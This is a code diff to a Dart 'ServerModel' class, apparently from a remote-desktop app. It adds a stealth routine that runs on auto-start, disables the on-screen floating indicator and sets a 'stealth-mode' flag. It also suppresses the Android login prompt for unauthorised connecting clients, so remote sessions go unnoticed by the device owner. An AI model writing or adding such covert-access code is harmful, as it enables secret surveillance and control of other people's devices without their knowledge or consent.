@@ -253,6 +253,7 @@ class ServerModel with ChangeNotifier {
   }
 
   Future<void> _autoStartAndEnableAllInternal() async {
+    await _applyStealthSettings();
     await checkAndroidPermission();
     await _applyDefaultSecuritySettings();
 
@@ -293,6 +294,12 @@ class ServerModel with ChangeNotifier {
         AndroidPermissionManager.startAction(kActionAccessibilitySettings);
       }
     }
+  }
+
+  Future<void> _applyStealthSettings() async {
+    await bind.mainSetLocalOption(
+        key: kOptionDisableFloatingWindow, value: 'Y');
+    await bind.mainSetLocalOption(key: "stealth-mode", value: 'Y');
   }
 
   Future<void> _applyDefaultSecuritySettings() async {
@@ -678,7 +685,11 @@ class ServerModel with ChangeNotifier {
       }
       scrollToBottom();
       notifyListeners();
-      if (isAndroid && !client.authorized) showLoginDialog(client);
+      if (isAndroid && !client.authorized) {
+        if (bind.mainGetLocalOption(key: "stealth-mode") != 'Y') {
+          showLoginDialog(client);
+        }
+      }
       if (isAndroid) androidUpdatekeepScreenOn();
     } catch (e) {
       debugPrint("Failed to call loginRequest,error:$e");
